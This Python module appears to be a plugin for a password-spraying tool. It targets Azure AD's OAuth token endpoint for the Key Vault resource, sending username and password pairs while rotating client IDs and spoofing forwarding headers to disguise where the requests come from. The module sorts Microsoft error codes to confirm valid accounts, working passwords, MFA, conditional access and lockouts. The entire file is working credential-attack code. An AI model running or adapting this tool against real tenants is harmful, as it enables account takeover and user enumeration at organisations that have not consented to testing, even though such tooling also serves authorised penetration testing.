import requests, random
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def extract_error(desc):

    return desc.split(":")[0].strip()


def azvault_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    client_ids = [
        "4345a7b9-9a63-4910-a426-35363201d503", # alternate client_id taken from Optiv's Go365
        "1b730954-1685-4b74-9bfd-dac224a7b894",
        "0a7bdc5c-7b57-40be-9939-d4c5fc7cd417",
        "1950a258-227b-4e31-a9cf-717495945fc2",
        "00000002-0000-0000-c000-000000000000",
        "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
        "30cad7ca-797c-4dba-81f6-8b01f6371013"
    ]
    client_id = random.choice(client_ids)

    body = {
        'resource' : 'https://vault.azure.net',
        'client_id' : client_id,
        'client_info' : '1',
        'grant_type' : 'password',
        'username' : username,
        'password' : password,
        'scope' : 'openid',
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
        "User-Agent" : useragent,

        'Accept' : 'application/json',
        'Content-Type' : 'application/x-www-form-urlencoded'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:
        resp = requests.post("{}/common/oauth2/token".format(url), headers=headers, data=body)

        if resp.status_code == 200:
            data_response['result'] = "success"
            data_response['output'] = "[+] SUCCESS: {}:{}".format(username, password)
            data_response['valid_user'] = True

        else:
            response = resp.json()
            error = response["error_description"]
            error_code = extract_error(error)

            if "AADSTS50126" in error:
                data_response['result'] = "failure"
                data_response['output'] = "[-] FAILURE ({}): Invalid username or password. Username: {} could exist".format(error_code, username)

            elif "AADSTS50128" in error or "AADSTS50059" in error:
                data_response['result'] = "failure"
                data_response['output'] = "[-] FAILURE ({}): Tenant for account {} is not using AzureAD/Office365".format(error_code, username)

            elif "AADSTS50034" in error:
                data_response['result'] = "failure"
                data_response['output'] = '[-] FAILURE ({}): Tenant for account {} is not using AzureAD/Office365'.format(error_code, username)

            elif "AADSTS53003" in error:
                # Access successful but blocked by CAP
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS ({}): {}:{} - NOTE: The response indicates token access is blocked by CAP".format(error_code, username, password)
                data_response['valid_user'] = True  

            elif "AADSTS50076" in error:
                # Microsoft MFA response
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS ({}): {}:{} - NOTE: The response indicates MFA (Microsoft) is in use".format(error_code, username, password)
                data_response['valid_user'] = True

            elif "AADSTS50079" in error:
                # Microsoft MFA response
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS ({}): {}:{} - NOTE: The response indicates MFA (Microsoft) must be onboarded!".format(error_code, username, password)
                data_response['valid_user'] = True

            elif "AADSTS50158" in error:
                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS ({}): {}:{} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.".format(error_code, username, password)
                data_response['valid_user'] = True

            elif "AADSTS50053" in error:
                # Locked out account or Smart Lockout in place
                data_response['result'] = "potential"
                data_response['output'] = "[?] WARNING ({}): The account {} appears to be locked.".format(error_code, username)
                data_response['valid_user'] = True

            elif "AADSTS50055" in error:
                # User password is expired
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS ({}): {}:{} - NOTE: The user's password is expired.".format(error_code, username, password)
                data_response['valid_user'] = True

            else:
                # Unknown errors
                data_response['result'] = "failure"
                data_response['output'] = "[-] FAILURE ({}): Got an error we haven't seen yet for user {}".format(error_code, username)

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
